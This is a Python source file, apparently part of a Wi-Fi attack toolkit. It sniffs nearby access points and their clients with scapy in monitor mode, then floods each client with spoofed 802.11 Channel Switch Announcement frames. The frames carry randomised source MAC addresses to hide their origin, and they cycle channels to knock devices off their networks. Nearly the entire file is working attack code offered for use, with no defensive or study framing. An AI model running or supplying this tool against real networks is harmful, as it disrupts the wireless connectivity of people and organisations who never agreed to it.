from scapy.all import *
import threading
import time
from queue import Queue
from FreewayTools.colors import cprint, wprint, cinput, ColorCodes

# Global event to control threads
thread_event = threading.Event()

class Sniffer:
    def __init__(self, interface, collector, debug=False):
        self.interface = interface
        self.collector = collector
        self.debug = debug
        self.ap_clients = {} 
        self.lock = threading.Lock()

    def packet_handler(self, packet):
        if thread_event.is_set():
            return

        # Only process management frames
        if packet.haslayer(Dot11):
            dot11_layer = packet.getlayer(Dot11)
            # Beacon frame (Subtype 8) - an AP
            if dot11_layer.type == 0 and dot11_layer.subtype == 8:
                ap_bssid = dot11_layer.addr2
                ssid = packet[Dot11Elt].info.decode(errors='ignore') if packet.haslayer(Dot11Elt) else "Unknown"
                with self.lock:
                    if ap_bssid not in self.ap_clients:
                        self.ap_clients[ap_bssid] = set()
                        cprint(f"Detected AP: {ssid} [{ap_bssid}]")
            elif dot11_layer.type == 0 and dot11_layer.subtype in [4, 0]:
                client_mac = dot11_layer.addr2 
                if dot11_layer.addr1: 
                    ap_bssid = dot11_layer.addr1
                    with self.lock:
                        if ap_bssid in self.ap_clients:
                            if client_mac not in self.ap_clients[ap_bssid]:
                                self.ap_clients[ap_bssid].add(client_mac)
                                cprint(f"Detected client: {client_mac} -> AP: {ap_bssid}")
            elif dot11_layer.type == 2:
                src = dot11_layer.addr2
                dst = dot11_layer.addr1
                with self.lock:
                    for ap_bssid in self.ap_clients:
                        if src == ap_bssid and dst not in self.ap_clients[ap_bssid]:
                            self.ap_clients[ap_bssid].add(dst)
                            cprint(f"Detected client: {dst} -> AP: {ap_bssid}")
                        elif dst == ap_bssid and src not in self.ap_clients[ap_bssid]:
                            self.ap_clients[ap_bssid].add(src)
                            cprint(f"Detected client: {src} -> AP: {ap_bssid}")

        if self.debug:
            cprint(f"Current packet: {packet.summary()}")

    def run_sniff(self):
        while not thread_event.is_set():
            try:
                sniff(iface=self.interface, prn=self.packet_handler, store=0, monitor=True, timeout=1)
            except OSError as e:
                wprint(f"Network error on {self.interface}: {e}")
                time.sleep(1)
            except Exception as e:
                wprint(f"Unexpected error on {self.interface}: {e}")
                time.sleep(1)

    def get_ap_clients(self):
        with self.lock:
            return {ap: clients.copy() for ap, clients in self.ap_clients.items()}

class Spammer:
    def __init__(self, interfaces, sniffer, debug=False):
        self.stop_event = threading.Event()
        self.interfaces = interfaces
        self.sniffer = sniffer
        self.debug = debug
        self.threads = []
        self.channel_lock = threading.Lock()
        self.current_channels = {}

    def prep_csa_frame(self, target_bssid, target_client, new_channel, switch_count=1):
        csa_element = Dot11Elt(
            ID=37,
            info=struct.pack('BBB', 1, new_channel, switch_count)
        )

        action_frame = Dot11(
            type=0,                  # Management frame
            subtype=13,              # Action frame subtype
            addr1=target_client,     # Destination address (client)
            addr2=RandMAC(),         # Source address (randomized to obscure origin)
            addr3=target_bssid       # BSSID of the AP
        ) / Dot11Action(
            category=0               # Spectrum Management
        ) / Raw(b'\x04') / csa_element  # Action ID=4 followed by CSA element

        return action_frame

    def send_csa_frames(self, interface):
        """
        Continuously send CSA frames to force APs to switch channels.
        :param interface: Network interface to send frames
        """
        while not self.stop_event.is_set():
            ap_clients = self.sniffer.get_ap_clients()
            if not ap_clients:
                if self.debug:
                    wprint("No APs or clients found yet.")
                time.sleep(1)
                continue

            for ap_bssid, clients in ap_clients.items():
                with self.channel_lock:
                    current_channel = self.current_channels.get(ap_bssid, 1)
                    new_channel = current_channel + 1 if current_channel < 11 else 1 # We try to make an AP use 5GHz band by blocking all 2.4GHz channels
                    self.current_channels[ap_bssid] = new_channel

                for client in clients:
                    # Prepare CSA frame
                    csa_frame = self.prep_csa_frame(
                        target_bssid=ap_bssid,
                        target_client=client,
                        new_channel=new_channel,
                        switch_count=1  # Switch immediately before the next beacon
                    )

                    sendp(
                        csa_frame,
                        iface=interface,
                        verbose=False
                    )

                    if self.debug:
                        cprint(f"CSA Frame Sent: AP {ap_bssid} -> Client {client}, New Channel {new_channel}")

                    time.sleep(0.05)

            time.sleep(1)

    def start_spamming(self):
        """
        Start spamming CSA frames on all specified interfaces.
        """
        for iface in self.interfaces:
            thread = threading.Thread(target=self.send_csa_frames, args=(iface,), daemon=True)
            thread.start()
            self.threads.append(thread)
            cprint(f"Started CSA spamming on interface: {iface}", "green")

    def stop_spamming(self):
        """
        Stop all spamming threads.
        """
        self.stop_event.set()
        for thread in self.threads:
            thread.join()
        cprint("CSA Spamming stopped.", "green")

def run_csa_spam(interfaces=["wlan0"]):
    collector = Queue()

    sniffer = Sniffer(interface=interfaces, collector=collector, debug=True)
    sniffer_thread = threading.Thread(target=sniffer.run_sniff, daemon=True)
    sniffer_thread.start()
    cprint("Sniffer started.")

    time.sleep(5)

    spammer = Spammer(interfaces=interfaces, sniffer=sniffer, debug=True)
    spammer.start_spamming()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cprint("Interrupt received, stopping...")
        thread_event.set()
        spammer.stop_spamming()
        sniffer_thread.join()
        cprint("All threads stopped. Exiting.")

if __name__ == "__main__":
    run_csa_spam()
